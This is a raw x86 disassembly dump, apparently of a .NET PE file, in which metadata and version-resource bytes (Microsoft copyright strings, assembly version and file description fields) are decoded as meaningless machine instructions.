  4084cb:	ins    BYTE PTR es:[edi],dx
  4084cc:	jae    0x4084fc
  4084ce:	push   ebx
  4084cf:	je     0x408543
  4084d1:	outs   dx,DWORD PTR ds:[esi]
  4084d2:	outs   dx,BYTE PTR ds:[esi]
  4084d3:	ins    BYTE PTR es:[di],dx
  4084d5:	jns    0x40852b
  4084d7:	jns    0x408549
  4084d9:	gs fs push edx
  4084dc:	gs jae 0x40854e
  4084df:	jne    0x408553
  4084e1:	arpl   WORD PTR [ebp+0x42],sp
  4084e4:	jne    0x40854f
  4084e6:	ins    BYTE PTR es:[edi],dx
  4084e7:	fs gs jb 0x4084f2
  4084eb:	xor    al,0x2e
  4084ed:	xor    BYTE PTR [esi],ch
  4084ef:	xor    BYTE PTR [esi],ch
  4084f1:	xor    BYTE PTR [eax],al
  4084f3:	add    BYTE PTR ds:0x1c020200,al
  4084f9:	sbb    al,0x5
  4084fb:	and    BYTE PTR [eax],al
  4084fd:	adc    al,BYTE PTR [eax+0x22007cd]
  408503:	add    DWORD PTR [esi],ecx
  408505:	adc    al,BYTE PTR [eax+0x10704cd]
  40850b:	adc    ch,BYTE PTR ds:0xe022006
  408511:	push   cs
  408512:	adc    dh,BYTE PTR [ecx]
  408514:	push   es
  408515:	and    BYTE PTR [ecx],al
  408517:	add    DWORD PTR [ecx],edx
  408519:	sub    DWORD PTR [ecx],0x2000108
  40851f:	add    BYTE PTR [eax],al
  408521:	add    BYTE PTR [eax],al
  408523:	add    BYTE PTR [eax+eax*1],al
  408526:	add    DWORD PTR [eax],ebx
  408528:	push   cs
  408529:	add    al,0x0
  40852b:	add    DWORD PTR [eax],ebx
  40852d:	or     BYTE PTR [eax],cl
  40852f:	add    BYTE PTR [ecx+eax*1],al
  408532:	sbb    BYTE PTR ds:0x6080805,bl
  408538:	add    BYTE PTR [ebx],al
  40853a:	add    DWORD PTR [eax+ebx*1],ebx
  40853d:	add    al,BYTE PTR [edx]
  40853f:	push   ds
  408540:	add    BYTE PTR [edi],al
  408542:	add    BYTE PTR [edx],al
  408544:	sbb    al,0x18
  408546:	adc    al,BYTE PTR [eax+0x10004f5]
  40854c:	add    DWORD PTR [eax],ebx
  40854e:	add    al,0x7
  408550:	add    DWORD PTR [edx],edx
  408552:	cmp    eax,0x1012005
  408557:	sgdtd  ds:0x18020200
  40855e:	sbb    BYTE PTR [esi],cl
  408560:	pop    es
  408561:	or     BYTE PTR [ecx],dl
  408563:	cmp    al,0x11
  408565:	inc    eax
  408566:	sbb    BYTE PTR [ecx],cl
  408568:	sbb    BYTE PTR [ecx],dl
  40856a:	inc    eax
  40856b:	adc    DWORD PTR [eax+ecx*1+0x7],esp
  40856f:	add    BYTE PTR [ecx],al
  408571:	sbb    eax,0xe3d8112
  408576:	or     BYTE PTR [eax],al
  408578:	add    al,BYTE PTR [edx]
  40857a:	push   cs
  40857b:	adc    BYTE PTR [edx],dl
  40857d:	cmp    DWORD PTR ds:0x2010006,0x43d8112
  408587:	and    BYTE PTR [ecx],al
  408589:	add    bl,BYTE PTR [esi+eax*1]
  40858c:	add    BYTE PTR [ecx],al
  40858e:	adc    al,BYTE PTR [ecx+0x20060e41]
  408594:	add    BYTE PTR ds:0x263d8112,bl
  40859a:	pop    es
  40859b:	push   cs
  40859c:	push   cs
  40859d:	sbb    eax,0x123d8112
  4085a2:	cmp    DWORD PTR ds:0x123d8112,0x81124181
  4085ac:	cmp    eax,0x23d8112
  4085b1:	sbb    eax,0x83d8112
  4085b6:	sbb    eax,0x83d8112
  4085bb:	sbb    eax,0x83d8112
  4085c0:	add    al,0x20
  4085c2:	add    DWORD PTR [eax],ecx
  4085c4:	add    eax,DWORD PTR ds:0x80e0220
  4085ca:	or     BYTE PTR [edi],al
  4085cc:	pop    es
  4085cd:	add    al,0x12
  4085cf:	sub    al,0x2
  4085d1:	push   cs
  4085d2:	or     BYTE PTR [ebx],al
  4085d4:	add    BYTE PTR [eax],al
  4085d6:	or     BYTE PTR [eax+eax*1],al
  4085d9:	add    DWORD PTR [ecx],eax
  4085db:	or     BYTE PTR [edi],al
  4085dd:	pop    es
  4085de:	add    al,0x2
  4085e0:	or     BYTE PTR [edx],dl
  4085e2:	inc    ecx
  4085e3:	push   cs
  4085e4:	add    eax,0x35120100
  4085e9:	sbb    BYTE PTR ds:0x12020207,al
  4085ef:	xor    eax,0x2022007
  4085f4:	push   cs
  4085f5:	adc    DWORD PTR [ecx+0x1000549],eax
  4085fb:	sbb    eax,0x70a0e0e
  408600:	add    eax,0x122c1202
  408605:	xor    eax,0x6191202
  40860a:	and    BYTE PTR [ecx],al
  40860c:	sbb    eax,0x5031d0e
  408611:	add    BYTE PTR [ecx],al
  408613:	adc    bl,BYTE PTR [ecx]
  408615:	or     BYTE PTR [esi],cl
  408617:	pop    es
  408618:	pop    es
  408619:	push   cs
  40861a:	push   cs
  40861b:	sbb    eax,0x122c120e
  408620:	sbb    DWORD PTR [edx],edx
  408622:	sbb    DWORD PTR ds:0x1070303,ebx
  408628:	push   cs
  408629:	adc    BYTE PTR [edi],al
  40862b:	or     DWORD PTR ds:0x1108080e,ebx
  408631:	cmp    BYTE PTR [edx],dl
  408633:	sub    BYTE PTR [edx],dl
  408635:	inc    ecx
  408636:	add    al,BYTE PTR [edx]
  408638:	sbb    eax,0x1200403
  40863d:	push   cs
  40863e:	or     BYTE PTR [eax],cl
  408640:	add    BYTE PTR [ebx],al
  408642:	or     BYTE PTR [esi],cl
  408644:	push   cs
  408645:	adc    DWORD PTR [ecx+0xb071049],eax
  40864b:	or     BYTE PTR [eax],cl
  40864d:	adc    DWORD PTR [eax],edi
  40864f:	or     BYTE PTR [esi],cl
  408651:	push   cs
  408652:	push   cs
  408653:	adc    ch,BYTE PTR [eax]
  408655:	adc    al,BYTE PTR [ecx+0x2]
  408658:	push   cs
  408659:	push   es
  40865a:	add    BYTE PTR [ebx],al
  40865c:	push   cs
  40865d:	sbb    al,0x1c
  40865f:	sbb    al,0xa
  408661:	pop    es
  408662:	add    eax,0x38110808
  408667:	adc    al,BYTE PTR [ecx+0x12]
  40866a:	inc    ecx
  40866b:	push   es
  40866c:	and    BYTE PTR [ecx],al
  40866e:	add    dl,BYTE PTR [ecx]
  408670:	sbb    DWORD PTR [ecx+0x5],0x81120020
  408677:	pop    ebp
  408678:	add    al,0x0
  40867a:	add    DWORD PTR [edx],eax
  40867c:	add    ecx,DWORD PTR [eax]
  40867e:	pop    es
  40867f:	push   es
  408680:	add    al,BYTE PTR [edx]
  408682:	add    al,BYTE PTR [edx]
  408684:	or     BYTE PTR [ebx],al
  408686:	add    eax,0xd0d0200
  40868b:	or     eax,0xd010004
  408690:	or     eax,0x8030707
  408695:	adc    al,BYTE PTR [eax+0x7070dd9]
  40869b:	add    al,0x2
  40869d:	adc    DWORD PTR [eax+0x18],ebx
  4086a0:	sbb    BYTE PTR ds:0x34110207,al
  4086a6:	or     DWORD PTR [ebx],eax
  4086a8:	pop    es
  4086a9:	add    DWORD PTR [eax],ebx
  4086ab:	add    DWORD PTR [ebx],eax
  4086ad:	add    eax,DWORD PTR [edi]
  4086af:	add    DWORD PTR [edx],eax
  4086b1:	or     al,0x7
  4086b3:	pop    es
  4086b4:	adc    ch,BYTE PTR [ebx*1+0x80e0e0e]
  4086bb:	add    bl,BYTE PTR ds:0x403
  4086c1:	sbb    eax,0x2200703
  4086c6:	add    DWORD PTR [edx],edx
  4086c8:	and    DWORD PTR [ebp+0x8],0x8012005
  4086cf:	sbb    eax,0x2000503
  4086d4:	add    cl,BYTE PTR [esi]
  4086d6:	push   cs
  4086d7:	or     BYTE PTR [edi],al
  4086d9:	add    al,0xe
  4086db:	sbb    eax,0x8031d03
  4086e0:	add    al,0x7
  4086e2:	add    cl,BYTE PTR [esi]
  4086e4:	or     BYTE PTR [esi],al
  4086e6:	add    BYTE PTR [edx],al
  4086e8:	add    cl,BYTE PTR [esi]
  4086ea:	adc    BYTE PTR [eax],cl
  4086ec:	or     DWORD PTR [edi],eax
  4086ee:	add    eax,0x80e1d0e
  4086f3:	or     BYTE PTR ds:0x3060203,bl
  4086f9:	add    eax,0x80e0307
  4086fe:	add    al,BYTE PTR [edi]
  408700:	add    DWORD PTR [eax],eax
  408702:	add    ah,BYTE PTR [ebp+0x6e]
  408705:	add    BYTE PTR [eax],al
  408707:	add    eax,0x1
  40870c:	add    BYTE PTR [esi],ah
  40870e:	add    DWORD PTR [eax],eax
  408710:	and    DWORD PTR [ebp+0x69],ecx
  408713:	arpl   WORD PTR [edx+0x6f],si
  408716:	jae    0x408787
  408718:	data16 je 0x40873b
  40871b:	push   edi
  40871c:	bound  esp,QWORD PTR gs:[eax]
  40871f:	push   eax
  408720:	ins    BYTE PTR es:[edi],dx
  408721:	popa   
  408722:	je     0x40878a
  408724:	outs   dx,DWORD PTR ds:[esi]
  408725:	jb     0x408794
  408727:	and    BYTE PTR [ebp+0x78],al
  40872a:	je     0x408791
  40872c:	outs   dx,BYTE PTR ds:[esi]
  40872d:	jae    0x408798
  40872f:	outs   dx,DWORD PTR ds:[esi]
  408730:	outs   dx,BYTE PTR ds:[esi]
  408731:	jae    0x408733
  408733:	add    BYTE PTR [esi],bh
  408735:	add    DWORD PTR [eax],eax
  408737:	cmp    DWORD PTR [ebx+0x6f],eax
  40873a:	jo     0x4087b5
  40873c:	jb     0x4087a7
  40873e:	addr16 push 0x63282074
  408744:	sub    DWORD PTR [eax],esp
  408746:	dec    ebp
  408747:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40874e:	je     0x408770
  408750:	inc    ebx
  408751:	outs   dx,DWORD PTR ds:[esi]
  408752:	jb     0x4087c4
  408754:	outs   dx,DWORD PTR ds:[esi]
  408755:	jb     0x4087b8
  408757:	je     0x4087c2
  408759:	outs   dx,DWORD PTR ds:[esi]
  40875a:	outs   dx,BYTE PTR ds:[esi]
  40875b:	and    BYTE PTR cs:[ecx+0x6c],al
  40875f:	ins    BYTE PTR es:[edi],dx
  408760:	and    BYTE PTR [edx+0x69],dh
  408763:	addr16 push 0x72207374
  408769:	gs jae 0x4087d1
  40876c:	jb     0x4087e4
  40876e:	gs fs add BYTE PTR cs:[eax],al
  408773:	sbb    al,BYTE PTR [ecx]
  408775:	add    BYTE PTR ds:0x7263694d,dl
  40877b:	outs   dx,DWORD PTR ds:[esi]
  40877c:	jae    0x4087ed
  40877e:	data16 je 0x4087a1
  408781:	inc    ebx
  408782:	outs   dx,DWORD PTR ds:[esi]
  408783:	jb     0x4087f5
  408785:	outs   dx,DWORD PTR ds:[esi]
  408786:	jb     0x4087e9
  408788:	je     0x4087f3
  40878a:	outs   dx,DWORD PTR ds:[esi]
  40878b:	outs   dx,BYTE PTR ds:[esi]
  40878c:	add    BYTE PTR [eax],al
  40878e:	sgdtd  [eax]
  408791:	or     dh,BYTE PTR [edi]
  408793:	xor    DWORD PTR cs:[esi],ebp
  408796:	xor    DWORD PTR [edi],esi
  408798:	xor    esi,DWORD PTR [esi]
  40879a:	xor    BYTE PTR cs:[eax],al
  40879d:	add    BYTE PTR [ecx+eax*1+0x0],bl
  4087a1:	push   edi
  4087a2:	cmp    bl,BYTE PTR fs:[ecx+ebp*2+0x69]
  4087a7:	jae    0x40880e
  4087a9:	js     0x40881b
  4087ab:	jb     0x408812
  4087ad:	jae    0x408822
  4087af:	pop    esp
  4087b0:	jo     0x408827
  4087b2:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4087b6:	pop    esp
  4087b7:	gs js  0x40882e
  4087ba:	pop    esp
  4087bb:	jae    0x408821
  4087bd:	imul   ebx,DWORD PTR [esi+esi*2+0x73],0x31
  4087c2:	xor    BYTE PTR [ebx+0x70],dh
  4087c5:	xor    DWORD PTR [ecx+ebp*2+0x6e],ebx
  4087c9:	je     0x408830
  4087cb:	jb     0x40883b
  4087cd:	popa   
  4087ce:	ins    BYTE PTR es:[edi],dx
  4087cf:	pop    esp
  4087d0:	jae    0x408846
  4087d2:	jb     0x408843
  4087d4:	outs   dx,BYTE PTR ds:[esi]
  4087d5:	outs   dx,BYTE PTR ds:[si]
  4087d7:	popa   
  4087d8:	ins    DWORD PTR es:[edi],dx
  4087d9:	imul   esp,DWORD PTR gs:[ebp+0x79],0x73
  4087de:	pop    esp
  4087df:	popaw  
  4087e1:	imul   esp,DWORD PTR [ebp+0x5c],0x4d
  4087e5:	push   ebx
  4087e6:	push   ebx
  4087e7:	push   0x64657261
  4087ec:	dec    esp
  4087ed:	imul   esp,DWORD PTR [edx+0x53],0x3230314e
  4087f4:	xor    al,0x2e
  4087f6:	jae    0x408866
  4087f8:	imul   eax,DWORD PTR [eax],0x0
  4087fb:	add    eax,0x10001
  408800:	add    BYTE PTR [eax],ch
  408802:	add    DWORD PTR [eax],eax
  408804:	and    ecx,DWORD PTR [ecx+0x49]
  408807:	push   ebx
  408808:	and    BYTE PTR [ebp+0x78],al
  40880b:	jo     0x40887f
  40880d:	gs jae 0x408883
  408810:	and    BYTE PTR [ecx+0x64],al
  408813:	ins    DWORD PTR es:[edi],dx
  408814:	imul   ebp,DWORD PTR [esi+0x20],0x6d6d6f43
  40881b:	popa   
  40881c:	outs   dx,BYTE PTR ds:[esi]
  40881d:	and    BYTE PTR fs:[ecx+ebp*2+0x6e],cl
  408822:	and    BYTE PTR gs:[edi+ebp*2+0x6f],dl
  408827:	ins    BYTE PTR es:[edi],dx
  408828:	add    BYTE PTR [eax],al
  40882a:	or     BYTE PTR [ecx],al
  40882c:	add    BYTE PTR [eax],cl
  40882e:	add    BYTE PTR [eax],al
  408830:	add    BYTE PTR [eax],al
  408832:	add    BYTE PTR [esi],bl
  408834:	add    DWORD PTR [eax],eax
  408836:	add    DWORD PTR [eax],eax
  408838:	push   esp
  408839:	add    dl,BYTE PTR [esi]
  40883b:	push   edi
  40883c:	jb     0x40889f
  40883e:	jo     0x40888e
  408840:	outs   dx,DWORD PTR ds:[esi]
  408841:	outs   dx,BYTE PTR ds:[esi]
  408842:	inc    ebp
  408843:	js     0x4088a8
  408845:	gs jo  0x4088bc
  408848:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40884f:	ja     0x4088c4
  408851:	add    DWORD PTR [eax-0x7ffed162],eax
  408857:	test   BYTE PTR [ebx+0x79],dl
  40885a:	jae    0x4088d0
  40885c:	gs ins DWORD PTR es:[edi],dx
  40885e:	cs push ebx
  408860:	arpl   WORD PTR gs:[ebp+0x72],si
  408864:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  40886c:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  408873:	cs push ebx
  408875:	arpl   WORD PTR gs:[ebp+0x72],si
  408879:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  408881:	jae    0x4088f6
  408883:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40888a:	imul   esp,DWORD PTR [edx+0x75],0x202c6574
  408891:	ins    DWORD PTR es:[edi],dx
  408892:	jae    0x4088f7
  408894:	outs   dx,DWORD PTR ds:[esi]
  408895:	jb     0x408903
  408897:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40889e:	jae    0x408909
  4088a0:	outs   dx,DWORD PTR ds:[esi]
  4088a1:	outs   dx,BYTE PTR ds:[esi]
  4088a2:	cmp    eax,0x2e302e32
  4088a7:	xor    BYTE PTR [esi],ch
  4088a9:	xor    BYTE PTR [eax+eiz*1],ch
  4088ac:	inc    ebx
  4088ad:	jne    0x40891b
  4088af:	je     0x408926
  4088b1:	jb     0x408918
  4088b3:	cmp    eax,0x7475656e
  4088b8:	jb     0x40891b
  4088ba:	ins    BYTE PTR es:[edi],dx
  4088bb:	sub    al,0x20
  4088bd:	push   eax
  4088be:	jne    0x408922
  4088c0:	ins    BYTE PTR es:[edi],dx
  4088c1:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4088c8:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4088cc:	bound  esi,QWORD PTR [edi]
  4088ce:	aaa    
  4088cf:	popa   
  4088d0:	xor    eax,0x31363563
  4088d5:	cmp    DWORD PTR [ebx],esi
  4088d7:	xor    al,0x65
  4088d9:	xor    BYTE PTR [eax],bh
  4088db:	cmp    DWORD PTR ds:0x10025401,edx
  4088e1:	push   ebx
  4088e2:	imul   ebp,DWORD PTR [ecx+0x70],0x56
  4088e6:	gs jb  0x408952
  4088e9:	imul   sp,WORD PTR [ebx+0x61],0x6974
  4088ef:	outs   dx,DWORD PTR ds:[esi]
  4088f0:	outs   dx,BYTE PTR ds:[esi]
  4088f1:	add    DWORD PTR [eax],eax
  4088f3:	add    BYTE PTR [eax],al
  4088f5:	add    BYTE PTR [eax],al
  4088f7:	add    ah,bl
  4088f9:	adc    al,0x52
  4088fb:	push   edi
  4088fc:	add    BYTE PTR [eax],al
  4088fe:	add    BYTE PTR [eax],al
  408900:	add    al,BYTE PTR [eax]
  408902:	add    BYTE PTR [eax],al
  408904:	das    
  408905:	add    BYTE PTR [eax],al
  408907:	add    BYTE PTR [eax],dl
  408909:	mov    DWORD PTR [eax],eax
  40890b:	add    BYTE PTR [eax],dl
  40890d:	jns    0x40890f
  40890f:	add    BYTE PTR [edx+0x53],dl
  408912:	inc    esp
  408913:	push   ebx
  408914:	xor    cl,BYTE PTR [ebp+0x26]
  408917:	or     esi,0xffffffb6
  40891a:	sbb    cl,BYTE PTR [edx-0x5e]
  40891d:	pop    sp
  40891f:	lods   al,BYTE PTR ds:[esi]
  408920:	adc    ebp,DWORD PTR [eax+0x16e01]
  408926:	add    BYTE PTR [eax],al
  408928:	dec    ecx
  408929:	imul   esi,DWORD PTR [ebx+0x45],0x65727078
  408930:	jae    0x4089a5
  408932:	popa   
  408933:	fs ins DWORD PTR es:[edi],dx
  408935:	imul   ebp,DWORD PTR [esi+0x43],0x702e646d
  40893c:	bound  eax,QWORD PTR fs:[eax]
	...
  40897f:	add    BYTE PTR [eax+0x89],ch
  408985:	add    BYTE PTR [eax],al
  408987:	add    BYTE PTR [eax],al
  408989:	add    BYTE PTR [eax],al
  40898b:	add    BYTE PTR [esi+0x89],bh
  408991:	and    BYTE PTR [eax],al
	...
  4089a7:	add    BYTE PTR [eax+0x89],dh
  4089ad:	add    BYTE PTR [eax],al
  4089af:	add    BYTE PTR [eax],al
  4089b1:	add    BYTE PTR [edi+0x43],bl
  4089b4:	outs   dx,DWORD PTR ds:[esi]
  4089b5:	jb     0x4089fc
  4089b7:	js     0x408a1e
  4089b9:	dec    ebp
  4089ba:	popa   
  4089bb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  4089c2:	jb     0x408a29
  4089c4:	gs cs fs ins BYTE PTR es:[edi],dx
  4089c8:	ins    BYTE PTR es:[edi],dx
  4089c9:	add    BYTE PTR [eax],al
  4089cb:	add    BYTE PTR [eax],al
  4089cd:	add    bh,bh
  4089cf:	and    eax,0x402000

Disassembly of section .rsrc:

0040a000 <.rsrc>:
	...
  40a00c:	add    BYTE PTR [eax],al
  40a00e:	add    al,BYTE PTR [eax]
  40a010:	adc    BYTE PTR [eax],al
  40a012:	add    BYTE PTR [eax],al
  40a014:	and    BYTE PTR [eax],al
  40a016:	add    BYTE PTR [eax+0x18],al
  40a01c:	cmp    BYTE PTR [eax],al
  40a01e:	add    BYTE PTR [eax+0x0],al
	...
  40a02c:	add    BYTE PTR [eax],al
  40a02e:	add    DWORD PTR [eax],eax
  40a030:	add    DWORD PTR [eax],eax
  40a032:	add    BYTE PTR [eax],al
  40a034:	push   eax
  40a035:	add    BYTE PTR [eax],al
  40a037:	add    BYTE PTR [eax],0x0
	...
  40a046:	add    DWORD PTR [eax],eax
  40a048:	add    DWORD PTR [eax],eax
  40a04a:	add    BYTE PTR [eax],al
  40a04c:	push   0x800000
	...
  40a05d:	add    BYTE PTR [ecx],al
  40a05f:	add    BYTE PTR [eax],al
  40a061:	add    BYTE PTR [eax],al
  40a063:	add    BYTE PTR [eax+0x0],al
	...
  40a075:	add    BYTE PTR [ecx],al
  40a077:	add    BYTE PTR [eax],al
  40a079:	add    BYTE PTR [eax],al
  40a07b:	add    BYTE PTR [eax-0x60000000],dl
  40a081:	mov    al,ds:0x4040000
	...
  40a08e:	add    BYTE PTR [eax],al
  40a090:	test   al,0xa4
  40a092:	add    BYTE PTR [eax],al
  40a094:	jmp    0x0:0x1
  40a09b:	add    BYTE PTR [eax],al
  40a09d:	add    BYTE PTR [eax],al
  40a09f:	add    BYTE PTR [esp+eax*1],al
  40a0a2:	xor    al,0x0
  40a0a4:	add    BYTE PTR [eax],al
  40a0a6:	push   esi
  40a0a7:	add    BYTE PTR [ebx+0x0],dl
  40a0aa:	pop    edi
  40a0ab:	add    BYTE PTR [esi+0x0],dl
  40a0ae:	inc    ebp
  40a0af:	add    BYTE PTR [edx+0x0],dl
  40a0b2:	push   ebx
  40a0b3:	add    BYTE PTR [ecx+0x0],cl
  40a0b6:	dec    edi
  40a0b7:	add    BYTE PTR [esi+0x0],cl
  40a0ba:	pop    edi
  40a0bb:	add    BYTE PTR [ecx+0x0],cl
  40a0be:	dec    esi
  40a0bf:	add    BYTE PTR [esi+0x0],al
  40a0c2:	dec    edi
  40a0c3:	add    BYTE PTR [eax],al
  40a0c5:	add    BYTE PTR [eax],al
  40a0c7:	add    BYTE PTR [ebp+0xfeef04],bh
  40a0cd:	add    BYTE PTR [ecx],al
  40a0cf:	add    BYTE PTR [ecx],al
  40a0d1:	add    BYTE PTR [edi],al
  40a0d3:	add    BYTE PTR [eax],al
  40a0d5:	add    al,cl
  40a0d7:	push   es
  40a0d8:	add    DWORD PTR [eax],eax
  40a0da:	pop    es
  40a0db:	add    BYTE PTR [eax],al
  40a0dd:	add    al,cl
  40a0df:	push   es
  40a0e0:	aas    
  40a0e1:	add    BYTE PTR [eax],al
  40a0e3:	add    BYTE PTR [eax],al
  40a0e5:	add    BYTE PTR [eax],al
  40a0e7:	add    BYTE PTR [eax+eax*1],al
  40a0ea:	add    BYTE PTR [eax],al
  40a0ec:	add    DWORD PTR [eax],eax
	...
  40a0fa:	add    BYTE PTR [eax],al
  40a0fc:	inc    esp
  40a0fd:	add    BYTE PTR [eax],al
  40a0ff:	add    BYTE PTR [ecx],al
  40a101:	add    BYTE PTR [esi+0x0],dl
  40a104:	popa   
  40a105:	add    BYTE PTR [edx+0x0],dh
  40a108:	inc    esi
  40a109:	add    BYTE PTR [ecx+0x0],ch
  40a10c:	ins    BYTE PTR es:[edi],dx
  40a10d:	add    BYTE PTR [ebp+0x0],ah
  40a110:	dec    ecx
  40a111:	add    BYTE PTR [esi+0x0],ch
  40a114:	data16 add BYTE PTR [edi+0x0],ch
  40a118:	add    BYTE PTR [eax],al
  40a11a:	add    BYTE PTR [eax],al
  40a11c:	and    al,0x0
  40a11e:	add    al,0x0
  40a120:	add    BYTE PTR [eax],al
  40a122:	push   esp
  40a123:	add    BYTE PTR [edx+0x0],dh
  40a126:	popa   
  40a127:	add    BYTE PTR [esi+0x0],ch
  40a12a:	jae    0x40a12c
  40a12c:	ins    BYTE PTR es:[edi],dx
  40a12d:	add    BYTE PTR [ecx+0x0],ah
  40a130:	je     0x40a132
  40a132:	imul   eax,DWORD PTR [eax],0x6e006f
  40a138:	add    BYTE PTR [eax],al
  40a13a:	add    BYTE PTR [eax],al
  40a13c:	add    BYTE PTR [eax],al
  40a13e:	mov    al,0x4
  40a140:	add    eax,DWORD PTR fs:[eax]
  40a143:	add    BYTE PTR [ecx],al
  40a145:	add    BYTE PTR [ebx+0x0],dl
  40a148:	je     0x40a14a
  40a14a:	jb     0x40a14c
  40a14c:	imul   eax,DWORD PTR [eax],0x67006e
  40a152:	inc    esi
  40a153:	add    BYTE PTR [ecx+0x0],ch
  40a156:	ins    BYTE PTR es:[edi],dx
  40a157:	add    BYTE PTR [ebp+0x0],ah
  40a15a:	dec    ecx
  40a15b:	add    BYTE PTR [esi+0x0],ch
  40a15e:	data16 add BYTE PTR [edi+0x0],ch
  40a162:	add    BYTE PTR [eax],al
  40a164:	inc    eax
  40a165:	add    eax,DWORD PTR [eax]
  40a167:	add    BYTE PTR [ecx],al
  40a169:	add    BYTE PTR [eax],dh
  40a16b:	add    BYTE PTR [eax],dh
  40a16d:	add    BYTE PTR [eax],dh
  40a16f:	add    BYTE PTR [eax],dh
  40a171:	add    BYTE PTR [eax],dh
  40a173:	add    BYTE PTR [eax+eax*1],dh
  40a176:	bound  eax,QWORD PTR [eax]
  40a178:	xor    BYTE PTR [eax],al
  40a17a:	add    BYTE PTR [eax],al
  40a17c:	pusha  
  40a17d:	add    BYTE PTR [eax+eax*1],ah
  40a180:	add    DWORD PTR [eax],eax
  40a182:	inc    ebx
  40a183:	add    BYTE PTR [edi+0x0],ch
  40a186:	ins    DWORD PTR es:[edi],dx
  40a187:	add    BYTE PTR [ebp+0x0],ch
  40a18a:	add    BYTE PTR gs:[esi+0x0],ch
  40a18e:	je     0x40a190
  40a190:	jae    0x40a192
  40a192:	add    BYTE PTR [eax],al
  40a194:	dec    ecx
  40a195:	add    BYTE PTR [ecx+0x0],cl
  40a198:	push   ebx
  40a199:	add    BYTE PTR [eax],ah
  40a19b:	add    BYTE PTR [ebp+0x0],al
  40a19e:	js     0x40a1a0
  40a1a0:	jo     0x40a1a2
  40a1a2:	jb     0x40a1a4
  40a1a4:	add    BYTE PTR gs:[ebx+0x0],dh
  40a1a8:	jae    0x40a1aa
  40a1aa:	and    BYTE PTR [eax],al
  40a1ac:	inc    ecx
  40a1ad:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40a1b1:	add    BYTE PTR [ecx+0x0],ch
  40a1b4:	outs   dx,BYTE PTR ds:[esi]
  40a1b5:	add    BYTE PTR [eax],ah
  40a1b7:	add    BYTE PTR [ebx+0x0],al
  40a1ba:	outs   dx,DWORD PTR ds:[esi]
  40a1bb:	add    BYTE PTR [ebp+0x0],ch
  40a1be:	ins    DWORD PTR es:[edi],dx
  40a1bf:	add    BYTE PTR [ecx+0x0],ah
  40a1c2:	outs   dx,BYTE PTR ds:[esi]
  40a1c3:	add    BYTE PTR [eax+eax*1+0x20],ah
  40a1c7:	add    BYTE PTR [eax+eax*1+0x69],cl
  40a1cb:	add    BYTE PTR [esi+0x0],ch
  40a1ce:	add    BYTE PTR gs:[eax],ah
  40a1d1:	add    BYTE PTR [eax+eax*1+0x6f],dl
  40a1d5:	add    BYTE PTR [edi+0x0],ch
  40a1d8:	ins    BYTE PTR es:[edi],dx
  40a1d9:	add    BYTE PTR [eax],al
  40a1db:	add    BYTE PTR [eax+eax*1+0x16],cl
  40a1df:	add    BYTE PTR [ecx],al
  40a1e1:	add    BYTE PTR [ebx+0x0],al
  40a1e4:	outs   dx,DWORD PTR ds:[esi]
  40a1e5:	add    BYTE PTR [ebp+0x0],ch
  40a1e8:	jo     0x40a1ea
  40a1ea:	popa   
  40a1eb:	add    BYTE PTR [esi+0x0],ch
  40a1ee:	jns    0x40a1f0
  40a1f0:	dec    esi
  40a1f1:	add    BYTE PTR [ecx+0x0],ah
  40a1f4:	ins    DWORD PTR es:[edi],dx
  40a1f5:	add    BYTE PTR [ebp+0x0],ah
  40a1f8:	add    BYTE PTR [eax],al
  40a1fa:	add    BYTE PTR [eax],al
  40a1fc:	dec    ebp
  40a1fd:	add    BYTE PTR [ecx+0x0],ch
  40a200:	arpl   WORD PTR [eax],ax
  40a202:	jb     0x40a204
  40a204:	outs   dx,DWORD PTR ds:[esi]
  40a205:	add    BYTE PTR [ebx+0x0],dh
  40a208:	outs   dx,DWORD PTR ds:[esi]
  40a209:	add    BYTE PTR [esi+0x0],ah
  40a20c:	je     0x40a20e
  40a20e:	and    BYTE PTR [eax],al
  40a210:	inc    ebx
  40a211:	add    BYTE PTR [edi+0x0],ch
  40a214:	jb     0x40a216
  40a216:	jo     0x40a218
  40a218:	outs   dx,DWORD PTR ds:[esi]
  40a219:	add    BYTE PTR [edx+0x0],dh
  40a21c:	popa   
  40a21d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a221:	add    BYTE PTR [edi+0x0],ch
  40a224:	outs   dx,BYTE PTR ds:[esi]
  40a225:	add    BYTE PTR [eax],al
  40a227:	add    BYTE PTR [eax+eax*1],ch
  40a22a:	add    al,BYTE PTR [eax]
  40a22c:	add    DWORD PTR [eax],eax
  40a22e:	inc    esi
  40a22f:	add    BYTE PTR [ecx+0x0],ch
  40a232:	ins    BYTE PTR es:[edi],dx
  40a233:	add    BYTE PTR [ebp+0x0],ah
  40a236:	inc    esp
  40a237:	add    BYTE PTR [ebp+0x0],ah
  40a23a:	jae    0x40a23c
  40a23c:	arpl   WORD PTR [eax],ax
  40a23e:	jb     0x40a240
  40a240:	imul   eax,DWORD PTR [eax],0x740070
  40a246:	imul   eax,DWORD PTR [eax],0x6e006f
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    BYTE PTR [eax],al
  40a250:	and    BYTE PTR [eax],al
  40a252:	add    BYTE PTR [eax],al
  40a254:	cmp    BYTE PTR [eax],al
  40a256:	or     eax,DWORD PTR [eax]
  40a258:	add    DWORD PTR [eax],eax
  40a25a:	inc    esi
  40a25b:	add    BYTE PTR [ecx+0x0],ch
  40a25e:	ins    BYTE PTR es:[edi],dx
  40a25f:	add    BYTE PTR [ebp+0x0],ah
  40a262:	push   esi
  40a263:	add    BYTE PTR [ebp+0x0],ah
  40a266:	jb     0x40a268
  40a268:	jae    0x40a26a
  40a26a:	imul   eax,DWORD PTR [eax],0x6e006f
  40a270:	add    BYTE PTR [eax],al
  40a272:	add    BYTE PTR [eax],al
  40a274:	aaa    
  40a275:	add    BYTE PTR [esi],ch
  40a277:	add    BYTE PTR [ecx],dh
  40a279:	add    BYTE PTR [esi],ch
